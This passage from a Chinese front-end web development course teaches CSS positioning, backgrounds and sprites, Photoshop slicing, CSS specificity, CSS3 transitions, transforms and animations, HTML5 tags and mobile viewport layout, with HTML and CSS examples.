生成绝对定位元素，元素脱离文档流，不占据文档流的位置，可以理解为漂浮在文档流的上方，相对于上一个设置了定位的父级元素来进行定位，如果找不到，则相对于body元素进行定位。fixed 生成固定定位元素，元素脱离文档流，不占据文档流的位置，可以理解为漂浮在文档流的上方，相对于浏览器窗口进行定位。static 默认值，没有定位，元素出现在正常的文档流中，相当于取消定位属性或者不设置定位属性。inherit 从父元素继承 position 属性的值。123456789101112131415161718192021222324252627282930313233343536/* relative 相对定位元素 */&lt;style type="text/css"&gt; .con&#123; width: 400px; height: 400px; border: 1px solid #000000; margin: 50px auto 0;&#125;.box01,.box02&#123; width: 300px; height: 100px; margin: 10px;&#125;.box01&#123; background-color: green; position: relative; left: 50px; top: 50px;&#125;.box02&#123; background-color: gold;&#125;&lt;/style&gt;&lt;div class="con"&gt; &lt;div class="box01"&gt; &lt;/div&gt; &lt;div class="box02"&gt; &lt;/div&gt;&lt;/div&gt;123456789101112131415161718192021222324252627282930313233343536/* absolute 绝对定位元素:相对于body元素进行定位 */&lt;style type="text/css"&gt; .con&#123; width: 400px; height: 400px; border: 1px solid #000000; margin: 50px auto 0; &#125; .box01,.box02&#123; width: 300px; height: 100px; margin: 10px; &#125; .box01&#123; background-color: green; position: absolute; left: 50px; top: 50px; &#125; .box02&#123; background-color: gold; &#125;&lt;/style&gt;&lt;div class="con"&gt; &lt;div class="box01"&gt; &lt;/div&gt; &lt;div class="box02"&gt; &lt;/div&gt;&lt;/div&gt;12345678910111213141516171819202122232425262728293031323334353637/* absolute 绝对定位元素:相对于上一个设置了定位的父级元素来进行定位 */&lt;style type="text/css"&gt; .con&#123; width: 400px; height: 400px; border: 1px solid #000000; margin: 50px auto 0; position: relative;&#125; .box01,.box02&#123; width: 300px; height: 100px; margin: 10px; &#125; .box01&#123; background-color: green; position: absolute; left: 50px; top: 50px; &#125; .box02&#123; background-color: gold; &#125;&lt;/style&gt;&lt;div class="con"&gt; &lt;div class="box01"&gt; &lt;/div&gt; &lt;div class="box02"&gt; &lt;/div&gt;&lt;/div&gt;123456789101112131415161718192021222324252627282930313233343536/* fixed 固定定位元素:相对于浏览器窗口进行定位 */&lt;style type="text/css"&gt; .con&#123; width: 400px; height: 400px; border: 1px solid #000000; margin: 50px auto 0;&#125;.box01,.box02&#123; width: 300px; height: 100px; margin: 10px;&#125;.box01&#123; background-color: green; position: fixed; left: 50px; top: 50px;&#125;.box02&#123; background-color: gold;&#125;&lt;/style&gt;&lt;div class="con"&gt; &lt;div class="box01"&gt; &lt;/div&gt; &lt;div class="box02"&gt; &lt;/div&gt;&lt;/div&gt;3.11.3 定位元素的偏移定位的元素还需要用left、right、top或者bottom来设置相对于参照元素的偏移值。3.11.4 定位元素层级定位元素是浮动的正常的文档流之上的，可以用z-index属性来设置元素的层级伪代码如下:1234567.box01&#123; ...... position:absolute; /* 设置了绝对定位 */ left:200px; /* 相对于参照元素左边向右偏移200px */ top:100px; /* 相对于参照元素顶部向下偏移100px */ z-index:10 /* 将元素层级设置为10(没有单位) 弹框使用：盖过所有的元素 */&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;style type="text/css"&gt; .con&#123; width: 400px; height: 400px; border: 1px solid #000000; margin: 50px auto 0; position: relative; &#125; .con div&#123; width: 200px; height: 200px; position: absolute; &#125; .box01&#123; background-color: green; left: 20px; top: 20px; z-index: 10; &#125; .box02&#123; background-color: gold; left: 40px; top: 40px; z-index: 11; &#125; .box03&#123; background-color: rebeccapurple; left: 60px; top: 60px; z-index: 12; &#125; .box04&#123; background-color: pink; left: 80px; top: 80px; &#125;&lt;/style&gt;&lt;div class="con"&gt; &lt;div class="box01"&gt;&lt;/div&gt; &lt;div class="box02"&gt;&lt;/div&gt; &lt;div class="box03"&gt;&lt;/div&gt; &lt;div class="box04"&gt;&lt;/div&gt;&lt;/div&gt;3.11.5 定位元素特性绝对定位和固定定位的块元素和行内元素会自动转化为行内块元素3.11.6 理解练习1、制作如下布局：123456789101112131415161718192021222324252627282930313233&lt;style type="text/css"&gt; .con&#123; width: 100px; height: 100px; background-color: gold; margin: 50px auto 0; position: relative; /*去掉尖角成圆的，若是圆形需要设置成50px*/ border-radius: 14px; &#125; .box&#123; width: 28px; height: 28px; background-color: red; color: white; text-align: center; line-height: 28px; /* 位置 */ position: absolute; left: 86px; top: -14px; /* 变成圆的 */ border-radius: 14px; &#125;&lt;/style&gt;&lt;div class="con"&gt; &lt;div class="box"&gt;5&lt;/div&gt;&lt;/div&gt;2、固定在顶部的水平居中的菜单12345678910111213141516&lt;style type="text/css"&gt; .menu&#123; height: 80px; background-color: gold; position: fixed; width: 960px; top: 0px; /* 根据窗口大小设置百分比 */ left: 50%; /* 根据前面的百分比再进行偏移，负值表示往左侧偏移 */ margin-left: -480px; &#125;&lt;/style&gt;&lt;div class="menu"&gt;菜单文字&lt;/div&gt;3、相对于浏览器窗口水平垂直居中的弹框123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;style type="text/css"&gt; .menu&#123; height: 80px; background-color: gold; position: fixed; width: 960px; top: 0px; left: 50%; margin-left: -480px; &#125; p&#123; text-align: center; &#125; .popup&#123; width: 500px; height: 300px; border: 1px solid #000000; background-color: #ffffff; position: fixed; left: 50%; margin-left: -251px; top: 50%; margin-top: -151px; z-index: 9999; &#125; .popup h2&#123; background-color: gold; margin: 10px; height: 40px; &#125; .mask&#123; position: fixed; width: 100%; height: 100%; background-color: grey; left: 0; top: 0; /*透明度*/ opacity: 0.5; z-index: 9998; &#125; .popup&#123; display: block; &#125;&lt;/style&gt;&lt;div class="menu"&gt;菜单文字&lt;/div&gt;&lt;div class="pop_con"&gt; &lt;div class="popup"&gt; &lt;h2&gt;弹框的标题&lt;/h2&gt; &lt;/div&gt; &lt;div class="mask"&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;网页内容&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;p&gt;网页内容&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;p&gt;网页内容&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;3.12 background属性3.12.1 属性解释background属性是css中应用比较多，且比较重要的一个属性，它是负责给盒子设置背景图片和背景颜色的，background是一个复合属性，它可以分解成如下几个设置项：background-color 设置背景颜色background-image 设置背景图片地址background-repeat 设置背景图片如何重复平铺background-position 设置背景图片的位置background-attachment 设置背景图片是固定还是随着页面滚动条滚动实际应用中，我们可以用background属性将上面所有的设置项放在一起，而且也建议这么做，这样做性能更高，而且兼容性更好，比如：“background: #00FF00 url(bgimage.gif) no-repeat left center fixed”，这里面的“#00ff00”是设置background-color；“url(bgimage.gif)”是设置background-image；“no-repeat”是设置background-repeat；“left center”是设置background-position；“fixed”是设置background-attachment，各个设置项用空格隔开，有的设置项不写也是可以的，它会使用默认值。3.12.2 举例下面这些例子使用下面这张图片做为背景图：1、“background:url(bg.jpg)”，默认设置一个图片地址，图片会从盒子的左上角开始将盒子铺满。2、“background:cyan url(bg.jpg) repeat-x”，横向平铺盒子，盒子其他部分显示背景颜色“cyan”。3、“background:cyan url(bg.jpg) repeat-y”，纵向平铺盒子，盒子其他部分显示背景颜色“cyan”。4、“background:cyan url(bg.jpg) no-repeat”，背景不重复，背景和盒子左上角对齐，盒子其他部分显示背景颜色“cyan”。5、“background:cyan url(bg.jpg) no-repeat left center”，背景不重复，背景和盒子左中对齐，盒子其他部分显示背景颜色“cyan”。6、“background:cyan url(bg.jpg) no-repeat right center”，背景不重复，背景和盒子右中对齐，也就是背景图片的右边对齐盒子的右边，盒子其他部分显示背景颜色“cyan”。相关代码：123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;test background&lt;/title&gt; &lt;style type="text/css"&gt; .backshow&#123; width:320px; height:160px; border:3px solid #333; float:left; margin:10px; &#125; .bg1&#123;background:cyan url(bg.jpg);&#125; .bg2&#123;background:cyan url(bg.jpg) repeat-x;&#125; .bg3&#123;background:cyan url(bg.jpg) repeat-y;&#125; .bg4&#123;background:cyan url(bg.jpg) no-repeat;&#125; .bg5&#123;background:cyan url(bg.jpg) no-repeat left center;&#125; .bg6&#123;background:cyan url(bg.jpg) no-repeat right center;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="backshow bg1"&gt;&lt;/div&gt; &lt;div class="backshow bg2"&gt;&lt;/div&gt; &lt;div class="backshow bg3"&gt;&lt;/div&gt; &lt;div class="backshow bg4"&gt;&lt;/div&gt; &lt;div class="backshow bg5"&gt;&lt;/div&gt; &lt;div class="backshow bg6"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;例子说明：background-position的设置，可以在水平方向设置“left”、“center”、“right”，在垂直方向设置“top”、“center”、“bottom”，除了设置这些方位词之外，还可以设置具体的数值。比如说，我们想把下边的盒子用右边的图片作为背景，并且让背景显示图片中靠近底部的那朵花：用上面中间那张图片作为左边那个比它尺寸小的盒子的背景，上面右边的实现效果设置为：“background:url(location_bg.jpg) -110px -150px”，第一个数值表示背景图相对于自己的左上角向左偏移110px，负值向左，正值向右，第二个数值表示背景图相对于自己的左上角向上偏移150px，负值向上，正值向下。实现原理示意图：对应代码：123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;test background&lt;/title&gt; &lt;style type="text/css"&gt; .backshow&#123; width:320px; height:160px; border:3px solid #333; float:left; margin:10px; &#125; .bg&#123;width:94px; height:94px; border:3px solid #666; background:url(location_bg.jpg) -110px -150px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="bg"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;理解练习：通过雪碧图制作如下布局：3.13 特征布局实例讲习经过对前面知识点的巩固和加深，我们可以使用前面学习到的知识来制作实际开发中碰到的一些典型的布局，以此来达到综合应用知识的目的。1、特征布局：翻页（所需知识点：盒模型、内联元素）2、特征布局：导航条01（所需知识点：盒模型、行内元素布局）3、特征布局：导航条02（所需知识点：盒模型、浮动、定位、字体对齐）4、特征布局：图片列表（所需知识点：盒模型、浮动）5、特征布局：新闻列表（所需知识点：盒模型、浮动）课后练习4. Photoshop4.1 常用图片格式图片是网页制作中很重要的素材，图片有不同的格式，每种格式都有自己的特性，了解这些特效，可以方便我们在制作网页时选取适合的图片格式，图片格式及特性如下：1、psdphotoshop的专用格式。优点：完整保存图像的信息，包括未压缩的图像数据、图层、透明等信息，方便图像的编辑。缺点：应用范围窄，图片容量相对比较大。2、jpg网页制作及日常使用最普遍的图像格式。优点：图像压缩效率高，图像容量相对最小。缺点：有损压缩，图像会丢失数据而失真，不支持透明背景，不能制作成动画。3、gif制作网页小动画的常用图像格式。优点：无损压缩，图像容量小、可以制作成动画、支持透明背景。缺点：图像色彩范围最多只有256色，不能保存色彩丰富的图像，不支持半透明，透明图像边缘有锯齿。4、png网页制作及日常使用比较普遍的图像格式。优点：无损压缩，图像容量小、支持透明背景和半透明色彩、透明图像的边缘光滑。缺点：不能制作成动画5、webp将要取代jpg的图像格式。优点：同jpg格式，容量相对比jpg还要小。缺点：同jpg格式，目前不支持所有的浏览器。位图和矢量图位图也叫点阵图，是由一个个的方形的像素点排列在一起拼接而成的，位图在放大时，图像会失真。上面讲的5种图像都属于位图。矢量图和位图组成图像的原理不同，它的图像轮廓是由函数曲线生成的，当放大图像时，实际的原理就是将曲线乘以一个倍数，图像可以轻易地放大，而且不会出现像素块，图像边缘也不会出现锯齿。svg目前首选的网页矢量图格式。优点：图像容量小、图像放大不失真、支持透明背景和半透明色彩、图像边缘光滑。缺点：色彩不够丰富。flash退出历史的重量级网页矢量图格式。优点：图像容量小、图像放大不失真、支持透明背景和半透明色彩、图像边缘光滑、还可以制作动画、可编写交互。缺点：不支持搜索引擎、运行慢、浏览器需要装插件才可支持。总结在网页制作中，如何选择合适的图片格式呢？1、使用大幅面图片时，如果要使用不透明背景的图片，就使用jpg图片；如果要使用透明或者半透明背景的图片，就使用png图片；2、使用小幅面图片或者图标图片时，如果图片含多种颜色，可以使用gif或png图片；如果图片是单色，而且要求有很好的显示效果，可以使用svg；如果是图片时动画的，可以使用gif。4.2 photoshop常用图片处理技巧photoshop是一款优秀的图像处理软件，作为前端开发工程师，掌握它的一些常用功能是必须的。photoshop的常用功能有：选择、裁剪图像、修图、取色、插入文字等等。除了这些常用功能，前端还需要掌握制作新图像、切图等技巧。本次讲解的photoshop版本为cs6。4.2.1 图片格式转换与压缩1、文件/存储为 选择图片类型以及压缩比；（不推荐）2、文件/存储为web所用格式 选择图片类型以及压缩比 （推荐）；4.2.2 图像放缩，平移1、 放缩工具 图像放大缩小，在图像上点击放大，按住alt键点击缩小，快捷键Ctrl+“+”放大 Ctrl+“-”缩小，双击此工具可以让图像按照原始大小显示。2、 平移工具 对图像进行移动，在使用其他工具时，按住空格键盘的空格键，可以切换到此工具，移动完后松开空格键回到原来的工具。双击此工具可以让图像放缩到显示区域完全显示。4.2.3 新建图像执行菜单命令 文件/新建 可以新建一张图片，设置大小，颜色模式选RGB，网页图片一般选择72像素/英寸，如果图像要打印，可设为300/英寸。背景按情况选透明或白色。4.2.4 移动选择与图层面板1、按住Ctrl，在图像上点击可以选中图层2、 选择此工具，勾选工具属性栏上的“自动选择图层”，可以在图像上点击选中图层3、移动元素同时按住Alt键可复制一个图层4、图层面板的操作，包括图层的显示隐藏、图层顺序、新建图层、图层删除4.2.5 针对图像中选中图层的操作1、移动2、自由变换 执行菜单命令 编辑/自由变换3、拖拽到另一张图像上完成图层拷贝4.2.6 历史记录面板记录20部操作，可以点击已经记录的操作步骤回到之前4.2.7 选择工具1、 矩形选择工具2、 椭圆选择工具 按住alt+shift键可以从中心拉出正圆3、 任意套索工具 用手任意画出选区，不精确，不常用4、 多边形套索 可以选择多边形物体，对于结构复杂的物体，可以点多个小段来选择。5、 磁性套索 可以自动在物体边缘生成选择线，但是由于太自动了，所以不够精确，也不常用。6、 魔术棒选择工具 按照点击的点的颜色范围来选择，可以设置范围的容差，容差越大，选择区域越大，对于有单色背景的图像中的元素，可以用它点选背景，然后反选，从而选中元素。7、 快速选择工具 直接在要选的元素上画，按照画的颜色范围进行选择。8、对图层创建选区：按住Ctrl，用鼠标点击图层面板中图层的图标，在图层外框生成选区。4.2.8 选区的编辑技巧1、新选区模式下移动选区2、选区的加、减、乘，工具属性栏上设置3、调整边缘 工具属性栏或者执行菜单命令 选择/调整边缘4、变换选区 执行菜单命令 选择/变换选区，可对选区进行缩放、移动等5、反选 执行菜单命令 选择/反向6、取消选择 执行菜单命令 选择/取消选择，快捷键ctrl+d4.2.9 选区特别注意选区（蚂蚁线）只对当前图层器起作用，选区操作失败一般是当前图层弄错了4.2.10 裁剪图像1、 裁切工具2、对选区执行菜单命令 图像/裁剪3、设置矩形框大小，创建固定宽高的矩形框，可进行固定尺寸裁剪4.2.11 针对确定选区的操作技巧1、复制 执行菜单命令 编辑/拷贝 快捷键ctrl+c2、粘贴 执行菜单命令 编辑/粘贴 快捷键ctrl+v3、填充 执行菜单命令 编辑/填充4、描边 执行菜单命令 编辑/描边5、删除 执行菜单命令 编辑/清除 快捷键 delete6、自由变换 执行菜单命令 编辑/自由变换 快捷键 ctrl+t4.2.12 擦除与修复工具1、 擦除工具2、 污点修复工具4.2.13 参考线技巧1、视图/标尺，显示标尺，在标尺上按住鼠标拖动可以拉出参考线2、视图/对齐到/参考线 让参考线移动时自动对齐到选框或者图像的边缘3、视图/新建参考线 可以精确创建参考线4.2.14 文本输入1、执行菜单命令 编辑/首选项/单位和标尺 设置文字的单位2、 文本输入3、文本编辑 属性工具栏上点击文本编辑按钮4.2.15 取色1、取色工具，点击前景色按钮，弹出取色对话框，当前工具切换成取色工具。2、点击前景色按钮，当前工具自动切换到取色工具4.2.16 图像大小与画布大小1、图像/图像大小 查看和设置图像的整体大小2、图像/画布大小 查看和设置图像的画板大小4.2.17 尺寸测量1、 切片工具 双击切片弹出切片对话框2、 切片选择工具2、 矩形框工具，打开信息面板4.3 photoshop批量切图技巧切图，就是从效果图中把网页制作需要的小图片裁剪出来。1、使用psd格式并且带有图层的图像切图2、在图像上用切片工具切出需要的小图3、双击切片，给切片命名4、将需要制作透明背景图像的切片的背景隐藏5、执行菜单命令 存储为web所用格式6、点选切片，设置切片的图片格式7、存储切片，选择“所有用户切片”，点存储(多个切片会自动存到所选文件夹中的images文件夹中)4.4 Photoshop制作雪碧图技巧雪碧图，就是将网页制作中使用的多个小图片合并成一个图片，使用css技术将这张合成的图片应用在网页不同的地方，雪碧图可以减少网页加载时的http请求数，优化网页性能。步骤：1、使用Photoshop新建一张背景透明的图片2、将小图片复制到此图片中，排列好每个图像的位置，图片幅面不够可以用画布大小调整大小3、按照所有小图片的范围裁剪图片，存为透明背景的png图片5. 前端页面开发流程1、创建页面项目目录2、使用Photoshop对效果图切图，切出网页制作中需要的小图片3、将装饰类图像合并，制作成雪碧图4、结合Photoshop和代码编辑器，参照效果图，进行html和css代码书写，制作页面6. HTML5和CSS36.1 CSS权重CSS权重指的是样式的优先级，有两条或多条样式作用于一个元素，权重高的那条样式对元素起作用,权重相同的，后写的样式会覆盖前面写的样式。6.1.1 权重的等级可以把样式的应用方式分为几个等级，按照等级来计算权重1、!important，加在样式属性值后，权重值为 100002、内联样式，如：style=””，权重值为10003、ID选择器，如：#content，权重值为1004、类，伪类和属性选择器，如： content、:hover 权重值为105、标签选择器和伪元素选择器，如：div、p、:before 权重值为16、通用选择器（*）、子选择器（&gt;）、相邻选择器（+）、同胞选择器（~）、权重值为06.1.2 权重的计算实例1、实例一：1234567891011&lt;style type="text/css"&gt; div&#123; color:red !important; &#125; &lt;/style&gt;......&lt;div style="color:blue"&gt;这是一个div元素&lt;/div&gt;&lt;!-- 两条样式同时作用一个div，上面的样式权重值为10000+1，下面的行间样式的权重值为1000，所以文字的最终颜色为red --&gt;2、实例二：12345678910111213141516171819&lt;style type="text/css"&gt; #content div.main_content h2&#123; color:red; &#125; #content .main_content h2&#123; color:blue; &#125;&lt;/style&gt;......&lt;div id="content"&gt; &lt;div class="main_content"&gt; &lt;h2&gt;这是一个h2标题&lt;/h2&gt; &lt;/div&gt;&lt;/div&gt;&lt;!-- 第一条样式的权重计算： 100+1+10+1，结果为112；第二条样式的权重计算： 100+10+1，结果为111；h2标题的最终颜色为red--&gt;6.2 CSS3新增选择器1、E:nth-child(n)：匹配元素类型为E且是父元素的第n个子元素123456789101112131415&lt;style type="text/css"&gt; .list div:nth-child(2)&#123; background-color:red; &#125;&lt;/style&gt;......&lt;div class="list"&gt; &lt;h2&gt;1&lt;/h2&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;5&lt;/div&gt;&lt;/div&gt;&lt;!-- 第2个子元素div匹配 --&gt;2、E:first-child：匹配元素类型为E且是父元素的第一个子元素3、E:last-child：匹配元素类型为E且是父元素的最后一个子元素4、E &gt; F E元素下面第一层子集5、E ~ F E元素后面的兄弟元素6、E + F 紧挨着的后面的兄弟元素属性选择器：1、E[attr] 含有attr属性的元素1234567&lt;style type="text/css"&gt; div[data-attr='ok']&#123; color:red; &#125;&lt;/style&gt;......&lt;div data-attr="ok"&gt;这是一个div元素&lt;/div&gt;2、E[attr=’ok’] 含有attr属性的元素且它的值为“ok”3、E[attr^=’ok’] 含有attr属性的元素且它的值的开头含有“ok”4、E[attr$=’ok’] 含有attr属性的元素且它的值的结尾含有“ok”5、E[attr*=’ok’] 含有attr属性的元素且它的值中含有“ok”6.3 CSS3圆角、rgba6.3.1 CSS3圆角设置某一个角的圆角，比如设置左上角的圆角：border-top-left-radius:30px 60px;同时分别设置四个角： border-radius:30px 60px 120px 150px;设置四个圆角相同：border-radius:50%;6.3.2 rgba（新的颜色值表示法）1、盒子透明度表示法：12345.box &#123; opacity:0.1; /* 兼容IE */ filter:alpha(opacity=10); &#125;2、rgba(0,0,0,0.1) 前三个数值表示颜色，第四个数值表示颜色的透明度6.4 CSS3 transition动画1、transition-property 设置过渡的属性，比如：width height background-color2、transition-duration 设置过渡的时间，比如：1s 500ms3、transition-timing-function 设置过渡的运动方式，常用有 linear(匀速)|ease(缓冲运动)4、transition-delay 设置动画的延迟5、transition: property duration timing-function delay 同时设置四个属性综合练习：制作鼠标移入图片时，图片说明滑入的效果6.5 CSS3 transform变换1、translate(x,y) 设置盒子位移2、scale(x,y) 设置盒子缩放3、rotate(deg) 设置盒子旋转4、skew(x-angle,y-angle) 设置盒子斜切5、perspective 设置透视距离6、transform-style flat | preserve-3d 设置盒子是否按3d空间显示7、translateX、translateY、translateZ 设置三维移动8、rotateX、rotateY、rotateZ 设置三维旋转9、scaleX、scaleY、scaleZ 设置三维缩放10、tranform-origin 设置变形的中心点11、backface-visibility 设置盒子背面是否可见举例：（翻面效果）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;翻面&lt;/title&gt; &lt;style type="text/css"&gt; .box&#123; width:300px; height:272px; margin:50px auto 0; transform-style:preserve-3d; position:relative; &#125; .box .pic&#123; width:300px; height:272px; position:absolute; background-color:cyan; left:0; top:0; transform:perspective(800px) rotateY(0deg); backface-visibility:hidden; transition:all 500ms ease; &#125; .box .back_info&#123; width:300px; height:272px; text-align:center; line-height:272px; background-color:gold; position:absolute; left:0; top:0; transform:rotateY(180deg); backface-visibility:hidden; transition:all 500ms ease; &#125; .box:hover .pic&#123; transform:perspective(800px) rotateY(180deg); &#125; .box:hover .back_info&#123; transform:perspective(800px) rotateY(0deg); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;div class="pic"&gt;&lt;img src="images/location_bg.jpg"&gt;&lt;/div&gt; &lt;div class="back_info"&gt;背面文字说明&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;6.6 CSS3 animation动画1、@keyframes 定义关键帧动画2、animation-name 动画名称3、animation-duration 动画时间4、animation-timing-function 动画曲线 linear(匀速)|ease(缓冲)|steps(步数)5、animation-delay 动画延迟6、animation-iteration-count 动画播放次数 n|infinite7、animation-direction 动画结束后是否反向还原 normal|alternate8、animation-play-state 动画状态 paused(停止)|running(运动)9、animation-fill-mode 动画前后的状态 none(缺省)|forwards(结束时停留在最后一帧)|backwards(开始时停留在定义的开始帧)|both(前后都应用)10、animation:name duration timing-function delay iteration-count direction;同时设置多个属性理解练习：1、风车动画2、loading动画3、人物走路动画123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;走路动画&lt;/title&gt; &lt;style type="text/css"&gt; .box&#123; width:120px; height:180px; border:1px solid #ccc; margin:50px auto 0; position:relative; overflow:hidden; &#125; .box img&#123; display:block; width:960px; height:182px; position: absolute; left:0; top:0; animation:walking 1.0s steps(8) infinite; &#125; @keyframes walking&#123; from&#123; left:0px; &#125; to&#123; left:-960px; &#125; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;img src="images/walking.png"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;动画中使用的图片如下：6.7 CSS3 浏览器前缀6.7.1 浏览器样式前缀为了让CSS3样式兼容，需要将某些样式加上浏览器前缀：-ms- 兼容IE浏览器-moz- 兼容firefox-o- 兼容opera-webkit- 兼容chrome 和 safari比如：12345678div&#123; -ms-transform: rotate(30deg); -webkit-transform: rotate(30deg); -o-transform: rotate(30deg); -moz-transform: rotate(30deg); transform: rotate(30deg);&#125;6.7.2 自动添加浏览器前缀目前的状况是，有些CSS3属性需要加前缀，有些不需要加，有些只需要加一部分，这些加前缀的工作可以交给插件来完成，比如安装： autoprefixer可以在Sublime text中通过package control 安装 autoprefixer6.7.3 Autoprefixer在Sublime text中的设置：1、preferences/key Bindings-User1&#123; "keys": ["ctrl+alt+x"], "command": "autoprefixer" &#125;2、Preferences&gt;package setting&gt;AutoPrefixer&gt;Setting-User12345&#123; "browsers": ["last 7 versions"], "cascade": true, "remove": true&#125;last 7 versions：最新的浏览器的7个版本cascade：缩进美化属性值remove：是否去掉不必要的前缀6.8 HTML5新增标签6.8.1 新增语义标签1、&lt;header&gt; 页面头部、页眉2、&lt;nav&gt; 页面导航3、&lt;article&gt; 一篇文章4、&lt;section&gt; 文章中的章节5、&lt;aside&gt; 侧边栏6、&lt;footer&gt; 页面底部、页脚6.8.2 音频视频1、&lt;audio&gt;2、&lt;video&gt;PC端兼容h5的新标签的方法，在页面中引入以下js文件:1&lt;script type="text/javascript" src="//cdn.bootcss.com/html5shiv/r29/html5.js"&gt;&lt;/script&gt;6.9 HTML5 新增表单控件新增类型：网址 邮箱 日期 时间 星期 数量 范围 电话 颜色 搜索12345678910&lt;label&gt;网址:&lt;/label&gt;&lt;input type=&quot;url&quot; name=&quot;&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;邮箱:&lt;/label&gt;&lt;input type=&quot;email&quot; name=&quot;&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;日期:&lt;/label&gt;&lt;input type=&quot;date&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;时间:&lt;/label&gt;&lt;input type=&quot;time&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;星期:&lt;/label&gt;&lt;input type=&quot;week&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;数量:&lt;/label&gt;&lt;input type=&quot;number&quot; name=&quot;&quot;&gt; &lt;br&gt;&lt;br&gt;&lt;label&gt;范围:&lt;/label&gt;&lt;input type=&quot;range&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;电话:&lt;/label&gt;&lt;input type=&quot;tel&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;颜色:&lt;/label&gt;&lt;input type=&quot;color&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;label&gt;搜索:&lt;/label&gt;&lt;input type=&quot;search&quot; name=&quot;&quot;&gt;&lt;br&gt;&lt;br&gt;新增常用表单控件属性：1、placeholder 设置文本框默认提示文字2、autofocus 自动获得焦点3、autocomplete 联想关键词7. 移动端页面开发7.1 移动端与PC端页面布局区别7.1.1 视口视口是移动设备上用来显示网页的区域，一般会比移动设备可视区域大，宽度可能是980px或者1024px，目的是为了显示下整个为PC端设计的网页，这样带来的后果是移动端会出现横向滚动条，为了避免这种情况，移动端会将视口缩放到移动端窗口的大小。这样会让网页不容易观看，可以用 meta 标签，name=“viewport ” 来设置视口的大小，将视口的大小设置为和移动设备可视区一样的大小。设置方法如下( 快捷方式：meta:vp + tab )：123456&lt;head&gt;......&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;......&lt;/head&gt;pc端与移动端渲染网页过程：7.1.2 视网膜屏幕（retina屏幕）清晰度解决方案视网膜屏幕指的是屏幕的物理像素密度更高的屏幕，物理像素可以理解为屏幕上的一个发光点，无数发光的点组成的屏幕，视网膜屏幕比一般屏幕的物理像素点更小，常见有2倍的视网膜屏幕和3倍的视网膜屏幕，2倍的视网膜屏幕，它的物理像素点大小是一般屏幕的1/4,3倍的视网膜屏幕，它的物理像素点大小是一般屏幕的1/9。图像在视网膜屏幕上显示的大小和在一般屏幕上显示的大小一样，但是由于视网膜屏幕的物理像素点比一般的屏幕小，图像在上面好像是被放大了，图像会变得模糊，为了解决这个问题，可以使用比原来大一倍的图像，然后用css样式强制把图像的尺寸设为原来图像尺寸的大小，就可以解决模糊的问题。清晰度解决过程示意图：背景图强制改变大小，可以使用background新属性background新属性background-size:length：用长度值指定背景图像大小。不允许负值。percentage：用百分比指定背景图像大小。不允许负值。auto：背景图像的真实大小。cover：将背景图像等比缩放到完全覆盖容器，背景图像有可能超出容器。contain：将背景图像等比缩放到宽度或高度与容器的宽度或高度相等，背景图像始终被包含在容器内。7.2 适配布局类型7.2.1 PC及移动端页面适配方法设备屏幕有多种不同的分辨率，页面适配方案有如下几种：1、全适配：响应式布局+流体布局2、移动端适配：流体布局+少量响应式基于rem的布局7.2.2 流体布局流体布局，就是使用百分比来设置元素的宽度，元素的高度按实际高度写固定值，流体布局中，元素的边线无法用百分比，可以使用样式中的计算函数 calc() 来设置宽度，或者使用 box-sizing 属性将盒子设置为从边线计算盒子尺寸。calc()可以通过计算的方式给元素加尺寸，比如： width：calc(25% - 